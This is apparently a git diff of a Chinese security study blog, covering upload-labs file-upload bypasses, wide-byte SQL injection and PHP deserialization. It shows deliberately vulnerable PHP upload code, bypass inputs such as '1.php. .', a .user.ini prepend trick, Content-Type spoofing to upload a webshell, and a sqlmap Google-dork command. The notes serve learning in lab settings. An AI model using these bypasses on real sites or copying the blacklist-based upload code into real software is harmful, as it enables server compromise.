class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);  <span class="comment">//分割文件名通过.来分割</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现.htaccess也被加入黑名单，所以我们要想其他方法，.user.ini绕过</p>
-<h1 id="user-ini文件写法"><a href="#user-ini文件写法" class="headerlink" title=".user.ini文件写法"></a>.user.ini文件写法</h1><blockquote>
-<p>auto_prepend_file&#x3D;1.jpg   &#x2F;&#x2F;目录下面所有PHP文件都会预先加载1.jpg文件下的内容</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
-<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="点加空格加点"><a href="#点加空格加点" class="headerlink" title="点加空格加点"></a>点加空格加点</h2><p>因为源码并未循环，只过滤了一遍，所以有漏洞可钻,  1.php. .</p>
-<blockquote>
-<p>file_name会变成1.php，然后file_ext读取的是.</p>
-</blockquote>
-<p>由于windows下后缀的.和空格都会自动被删除，所以我们通过burpsuite更改后缀</p>
-<p>很遗憾BUUCFT的源码不一样，但是我自己搭建的靶场也提交错误，所以只能使用大小写绕过，因为在系统下后缀改成大小写会被自动解析成为小写的</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" data-id="cmawczpo8002qik7kdxwe8tuv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/别名攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="别名攻击"><a href="#别名攻击" class="headerlink" title="别名攻击"></a>别名攻击</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>只提出了黑名单，可以使用别名攻击</p>
-<p>但是改成php3测试连接返回未空，而且会提示你下载一些东西，说明服务器并没将php3当作php来解析</p>
-<p>所以我没要找到服务器Apache的配置文件httpd.conf然后找到AddType,找到<kbd>#AddType application/x-httpd-php  .php</kbd>​这一句，意思是以什么结尾的服务器会以php认可</p>
-</blockquote>
-<p><img src="/.com//image-20250119180334-7khsgt2.png" alt="image"></p>
-<blockquote>
-<p>添加多一些后缀，也就可以实现别名攻击,还有可能和php版本有问题</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" data-id="cmawczpob002wik7k0rumgjof" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/文件类型绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><blockquote>
-<p>1.还是打开抓包工具，上传一句话木马，发现是上传成功了，说明是后端验证的</p>
-</blockquote>
-<blockquote>
-<p>2.通过content-type判断文件类型</p>
-</blockquote>
-<p><img src="/.com//image-20250119174443-twfakc5.png" alt="image"></p>
-<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><blockquote>
-<p>上传一句话木马php，然后把content-type的验证改为jpg的可以放行</p>
-</blockquote>
-<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><blockquote>
-<p>上传更改过后的一句话木马，上传jpg后缀的，然后burp改为php放行</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" data-id="cmawczpoc0031ik7k3dq644v7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/空格点绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="空格点绕过"><a href="#空格点绕过" class="headerlink" title="空格点绕过"></a>空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>可以用点空格点来绕过，<kbd>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</kbd>​因为加载的是文件名字，检测的是文件后缀</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmawczpod0035ik7k03c89p2l" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/" data-id="cmaxy8gc1002jkg7kbobyhjc2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -607,7 +414,7 @@ sqlmap -g &quot;inurl:.php?id=&quot;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" data-id="cmawczpoe0037ik7kcj4ocsbi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" data-id="cmaxy8gc3002okg7kdjfk9nc6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -835,7 +642,338 @@ sqlmap -g &quot;inurl:.php?id=&quot;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmawczpog003eik7k1zva3c4r" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmaxy8gc5002rkg7kbog0ft66" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/宽字节注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。</p>
+<p><strong>字符集:</strong> 也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集:<br> <strong>·ASCII编码:</strong> 单字节编码。<br> <strong>·gbk编码:</strong> 使用一字节和双字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。双字节的第一字节范围是0x81-0xFE。<br> <strong>·UTF-8编码:</strong> 使用一至四字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。其它字符用二至四个字节变长表示。<br><strong>宽字节:</strong> 就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
+<p>通常来说，一个gbk编码汉字，占用<strong>2个</strong>字节。一个utf-8编码的汉字，占用<strong>3个</strong>字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gc6002vkg7kexp943jv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/反序列化/反序列化详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="反序列化详解"><a href="#反序列化详解" class="headerlink" title="反序列化详解"></a>反序列化详解</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><blockquote>
+<p>将各种类型的数据压缩按照一定格式存储的过程 使用函数serialize()</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>0－</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    ...一些方法 不过序列化不在意这些</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//序列化结果</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;DEMO1&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;evi l&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;phpinfo()&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">这里的O表示这是一个对象</span><br><span class="line">    对象名占<span class="number">5</span>个字符</span><br><span class="line">    对象名是DEMO1</span><br><span class="line">    对象有<span class="number">2</span>个属性</span><br><span class="line">    注意属性的长度存在不可见字符<span class="number">0</span>  用来区分属性 是<span class="keyword">public</span> 还是<span class="keyword">private</span> 或者<span class="keyword">protected</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">php反序列化</a>漏洞又称**&#x3D;&#x3D;对象注入&#x3D;&#x3D;** ， 可能会导致&#x3D;&#x3D;远程代码执行（RCE）&#x3D;&#x3D;</p>
+<p>理解为&#x3D;&#x3D;漏洞执行unserialize函数&#x3D;&#x3D; 调用某一类并&#x3D;&#x3D;执行魔术方法&#x3D;&#x3D; 之后&#x3D;&#x3D;执行类中的函数&#x3D;&#x3D; 产生安全问题</p>
+</blockquote>
+<blockquote>
+<h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol>
+<li>unserialize()函数的&#x3D;&#x3D;变量可控&#x3D;&#x3D;</li>
+<li>php文件中存在&#x3D;&#x3D;可利用的类&#x3D;&#x3D;，类中有&#x3D;&#x3D;魔术方法&#x3D;&#x3D;</li>
+</ol>
+</blockquote>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><blockquote>
+<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><ol>
+<li>把题目代码<strong>复制</strong>到本地</li>
+<li>&#x3D;&#x3D;注释掉方法&#x3D;&#x3D;和&#x3D;&#x3D;一些没有用的东西&#x3D;&#x3D;</li>
+<li>本地对&#x3D;&#x3D;属性赋值&#x3D;&#x3D;，&#x3D;&#x3D;构造序列化&#x3D;&#x3D;，<strong>url编码后输出</strong>，避免把&#x3D;&#x3D;不可见字符&#x3D;&#x3D;的影响</li>
+</ol>
+</blockquote>
+<h5 id="操作过程举例："><a href="#操作过程举例：" class="headerlink" title="操作过程举例："></a>操作过程举例：</h5><p>对源代码进行注释后赋值</p>
